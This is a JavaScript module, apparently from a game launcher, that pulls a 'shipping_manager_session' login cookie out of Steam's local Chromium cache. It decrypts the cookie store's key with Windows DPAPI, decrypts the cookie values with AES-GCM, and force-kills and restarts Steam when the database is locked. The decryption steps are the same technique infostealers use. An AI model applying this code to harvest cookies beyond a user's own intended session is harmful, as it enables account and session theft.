/**
 * @fileoverview Steam Cookie Extraction using DPAPI
 * @module launcher/session/steam-extractor
 *
 * Extracts shipping_manager_session cookie from Steam's Chromium cache.
 * Uses Windows DPAPI to decrypt the stored AES key.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const logger = require('../logger');
const config = require('../config');

// Get native binding path for better-sqlite3
// In packaged mode, the .node file is in node_modules relative to app base dir
function getNativeBindingPath() {
  const isPkg = config.isPackaged();
  if (isPkg) {
    return path.join(config.getAppBaseDir(), 'node_modules', 'better-sqlite3', 'build', 'Release', 'better_sqlite3.node');
  }
  return undefined;
}

// Constants
const TARGET_DOMAIN = 'shippingmanager.cc';
const TARGET_COOKIE_NAME = 'shipping_manager_session';

/**
 * Get Steam cookie paths
 * @returns {object} Paths to cookie database and local prefs
 */
function getSteamPaths() {
  const userProfile = process.env.USERPROFILE || os.homedir();
  const steamBase = path.join(userProfile, 'AppData', 'Local', 'Steam', 'htmlcache');

  // Try new paths first (with Default subfolder)
  const newCookiePath = path.join(steamBase, 'Default', 'Network', 'Cookies');
  const newPrefsPath = path.join(steamBase, 'Local State');
  const oldPrefsPath = path.join(steamBase, 'Default', 'LocalPrefs.json');

  // Check which paths exist
  const cookiePath = fs.existsSync(newCookiePath) ? newCookiePath : null;
  let prefsPath = null;

  if (fs.existsSync(newPrefsPath)) {
    prefsPath = newPrefsPath;
  } else if (fs.existsSync(oldPrefsPath)) {
    prefsPath = oldPrefsPath;
  }

  return { cookiePath, prefsPath };
}

/**
 * Check if Steam extraction is available (Windows only)
 * @returns {boolean}
 */
function isAvailable() {
  if (process.platform !== 'win32') {
    return false;
  }

  const { cookiePath, prefsPath } = getSteamPaths();
  return Boolean(cookiePath && prefsPath);
}

/**
 * Get the AES decryption key from Steam's Local State using DPAPI
 * @param {string} prefsPath - Path to Local State or LocalPrefs.json
 * @returns {Buffer|null} Decrypted AES key or null on failure
 */
function getAesKey(prefsPath) {
  try {
    const prefsData = JSON.parse(fs.readFileSync(prefsPath, 'utf8'));
    const encryptedKeyB64 = prefsData.os_crypt?.encrypted_key;

    if (!encryptedKeyB64) {
      logger.error('[Steam] No encrypted_key found in prefs');
      return null;
    }

    // Decode base64 and remove DPAPI prefix (first 5 bytes: "DPAPI")
    const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
    const keyWithoutPrefix = encryptedKey.slice(5);

    // Decrypt with DPAPI
    const { Dpapi } = require('@primno/dpapi');
    const decryptedKey = Dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');

    return decryptedKey;
  } catch (err) {
    logger.error('[Steam] Failed to get AES key: ' + err.message);
    // Try alternative path
    const altPath = prefsPath.includes('Local State')
      ? prefsPath.replace('Local State', 'Default/LocalPrefs.json')
      : prefsPath.replace('Default/LocalPrefs.json', 'Local State');

    if (fs.existsSync(altPath)) {
      try {
        const prefsData = JSON.parse(fs.readFileSync(altPath, 'utf8'));
        const encryptedKeyB64 = prefsData.os_crypt?.encrypted_key;

        if (encryptedKeyB64) {
          const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
          const keyWithoutPrefix = encryptedKey.slice(5);
          const { Dpapi } = require('@primno/dpapi');
          return Dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
        }
      } catch (altErr) {
        logger.error('[Steam] Failed to get AES key from alt path: ' + altErr.message);
      }
    }

    return null;
  }
}

/**
 * Decrypt AES-256-GCM encrypted cookie value
 * @param {Buffer} encryptedValue - Encrypted cookie value
 * @param {Buffer} key - AES-256 key
 * @returns {string|null} Decrypted value or null on failure
 */
function decryptAesGcm(encryptedValue, key) {
  try {
    // Skip first 3 bytes (version prefix "v10" or "v11")
    const data = encryptedValue.slice(3);

    // Extract nonce (12 bytes), ciphertext, and tag (16 bytes)
    const nonce = data.slice(0, 12);
    const ciphertextWithTag = data.slice(12);
    const tag = ciphertextWithTag.slice(-16);
    const ciphertext = ciphertextWithTag.slice(0, -16);

    // Decrypt using AES-256-GCM
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
    decipher.setAuthTag(tag);

    const decrypted = Buffer.concat([
      decipher.update(ciphertext),
      decipher.final()
    ]);

    return decrypted.toString('utf8');
  } catch (err) {
    logger.error('[Steam] AES decryption failed: ' + err.message);
    return null;
  }
}

/**
 * Extract cookies from Steam's SQLite database
 * @returns {Promise<object|null>} Cookies object or null on failure
 */
async function extractCookies() {
  if (!isAvailable()) {
    logger.error('[Steam] Steam extraction not available on this platform');
    return null;
  }

  const { cookiePath, prefsPath } = getSteamPaths();

  if (!cookiePath || !prefsPath) {
    logger.error('[Steam] Cookie or prefs path not found');
    return null;
  }

  logger.info('[Steam] Starting cookie extraction...');
  logger.info('[Steam] Cookie path: ' + cookiePath);
  logger.info('[Steam] Prefs path: ' + prefsPath);

  // Get AES key
  logger.info('[Steam] Getting AES key...');
  const aesKey = getAesKey(prefsPath);
  if (!aesKey) {
    logger.error('[Steam] Failed to get AES key');
    return null;
  }
  logger.info('[Steam] AES key obtained, length: ' + aesKey.length);

  // Open SQLite database
  const Database = require('better-sqlite3');
  const nativeBinding = getNativeBindingPath();
  let db = null;
  let cookies = {};

  try {
    // Try to open database directly
    logger.info('[Steam] Opening database...');
    const dbOptions = { readonly: true };
    if (nativeBinding) dbOptions.nativeBinding = nativeBinding;
    db = new Database(cookiePath, dbOptions);
    logger.info('[Steam] Database opened');

    const rows = db.prepare(
      "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE ?"
    ).all(`%${TARGET_DOMAIN}`);

    logger.info('[Steam] Found ' + rows.length + ' cookie rows for domain ' + TARGET_DOMAIN);

    if (rows.length === 0) {
      logger.error('[Steam] No cookies found for domain ' + TARGET_DOMAIN);
      db.close();
      return null;
    }

    for (const row of rows) {
      logger.info('[Steam] Decrypting cookie: ' + row.name);
      const decryptedValue = decryptAesGcm(row.encrypted_value, aesKey);
      if (decryptedValue) {
        logger.info('[Steam] Cookie ' + row.name + ' decrypted, length: ' + decryptedValue.length);
        cookies[row.name] = decryptedValue;
      } else {
        logger.error('[Steam] Failed to decrypt cookie: ' + row.name);
      }
    }

    db.close();
    logger.info('[Steam] Database closed');

  } catch (err) {
    logger.error('[Steam] Database exception: ' + err.message);
    if (db) {
      try { db.close(); } catch { /* ignore */ }
    }

    // Database locked or cannot be opened - kill Steam and retry
    logger.info('[Steam] Database locked/unavailable, killing Steam to access...');
    cookies = await extractWithSteamKill(cookiePath, aesKey);
  }

  logger.info('[Steam] Cookies extracted: ' + Object.keys(cookies).join(', '));

  if (cookies && cookies[TARGET_COOKIE_NAME]) {
    logger.info('[Steam] Target cookie found, length: ' + cookies[TARGET_COOKIE_NAME].length);
    return cookies;
  }

  logger.error('[Steam] Target cookie ' + TARGET_COOKIE_NAME + ' not found in extracted cookies');
  return null;
}

/**
 * Check if Steam is currently running
 * @returns {Promise<boolean>}
 */
async function isSteamRunning() {
  const { execSync } = require('child_process');
  try {
    const result = execSync('tasklist /FI "IMAGENAME eq steam.exe"', { encoding: 'utf8' });
    return result.toLowerCase().includes('steam.exe');
  } catch {
    return false;
  }
}

/**
 * Kill Steam process
 * @param {boolean} force - Use /F flag
 */
function killSteam(force = false) {
  const { execSync } = require('child_process');
  const flags = force ? '/F /IM' : '/IM';
  try {
    execSync(`taskkill ${flags} steam.exe`, { encoding: 'utf8', stdio: 'ignore' });
  } catch {
    // Ignore errors
  }
}

/**
 * Start Steam in silent mode
 */
function startSteam() {
  const { spawn } = require('child_process');
  const steamPaths = [
    'C:\\Program Files (x86)\\Steam\\steam.exe',
    'C:\\Program Files\\Steam\\steam.exe'
  ];

  for (const steamPath of steamPaths) {
    if (fs.existsSync(steamPath)) {
      spawn(steamPath, ['-silent'], { detached: true, stdio: 'ignore' }).unref();
      logger.info('[Steam] Steam restarted');
      return;
    }
  }
  logger.warn('[Steam] Could not find Steam executable to restart');
}

/**
 * Sleep for ms milliseconds
 * @param {number} ms
 * @returns {Promise<void>}
 */
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Read cookies from database (assumes database is not locked)
 * @param {string} dbPath - Path to cookie database
 * @param {Buffer} aesKey - AES decryption key
 * @returns {object|null} Cookies object or null
 */
function readCookiesFromDb(dbPath, aesKey) {
  const Database = require('better-sqlite3');
  const nativeBinding = getNativeBindingPath();
  let db = null;

  try {
    const dbOptions = { readonly: true };
    if (nativeBinding) dbOptions.nativeBinding = nativeBinding;
    db = new Database(dbPath, dbOptions);

    const rows = db.prepare(
      "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE ?"
    ).all(`%${TARGET_DOMAIN}`);

    logger.info('[Steam] Found ' + rows.length + ' cookie rows');

    if (rows.length === 0) {
      db.close();
      return null;
    }

    const cookies = {};
    for (const row of rows) {
      const decryptedValue = decryptAesGcm(row.encrypted_value, aesKey);
      if (decryptedValue) {
        cookies[row.name] = decryptedValue;
      }
    }

    db.close();
    return Object.keys(cookies).length > 0 ? cookies : null;

  } catch (err) {
    if (db) {
      try { db.close(); } catch { /* ignore */ }
    }
    logger.error('[Steam] Database read error: ' + err.message);
    return null;
  }
}

/**
 * Extract cookies by killing Steam temporarily
 * @param {string} cookiePath - Cookie database path
 * @param {Buffer} aesKey - AES decryption key
 * @returns {Promise<object|null>} Cookies object or null
 */
async function extractWithSteamKill(cookiePath, aesKey) {
  const steamWasRunning = await isSteamRunning();

  if (!steamWasRunning) {
    logger.info('[Steam] Steam not running, reading database directly...');
    return readCookiesFromDb(cookiePath, aesKey);
  }

  logger.info('[Steam] Closing Steam temporarily...');

  // Try graceful exit first
  const { exec } = require('child_process');
  exec('start steam://exit');

  // Wait for Steam to close (max 10 seconds)
  for (let i = 0; i < 10; i++) {
    await sleep(1000);
    if (!await isSteamRunning()) {
      logger.info('[Steam] Steam closed gracefully');
      break;
    }
    // After 5 seconds, try taskkill without /F
    if (i === 4) {
      logger.info('[Steam] Trying taskkill...');
      killSteam(false);
    }
  }

  // If still running, force kill
  if (await isSteamRunning()) {
    logger.info('[Steam] Force killing Steam...');
    killSteam(true);
    await sleep(2000);
  }

  await sleep(1000);

  // Now read from unlocked database
  const cookies = readCookiesFromDb(cookiePath, aesKey);

  // Restart Steam if it was running before
  if (steamWasRunning) {
    logger.info('[Steam] Restarting Steam...');
    startSteam();
  }

  return cookies;
}

/**
 * Normalize a session cookie to consistent format (URL-decoded)
 * @param {string} cookie - The cookie value
 * @returns {string} Normalized cookie
 */
function normalizeCookie(cookie) {
  if (!cookie) return cookie;
  if (cookie.includes('%')) {
    try {
      const decoded = decodeURIComponent(cookie);
      logger.debug(`[Steam] Cookie was URL-encoded, decoded from ${cookie.length} to ${decoded.length} chars`);
      return decoded;
    } catch {
      logger.debug('[Steam] Cookie contains % but is not URL-encoded');
      return cookie;
    }
  }
  return cookie;
}

/**
 * Main Steam login function
 * @returns {Promise<object|null>} Object with session cookie and metadata, or null
 */
async function steamLogin() {
  const cookies = await extractCookies();

  if (!cookies || !cookies[TARGET_COOKIE_NAME]) {
    return null;
  }

  // Normalize the session cookie (ensure consistent format - always URL-decoded)
  const normalizedCookie = normalizeCookie(cookies[TARGET_COOKIE_NAME]);

  return {
    cookie: normalizedCookie,
    method: 'steam',
    allCookies: cookies
  };
}

module.exports = {
  isAvailable,
  extractCookies,
  steamLogin,
  getSteamPaths
};
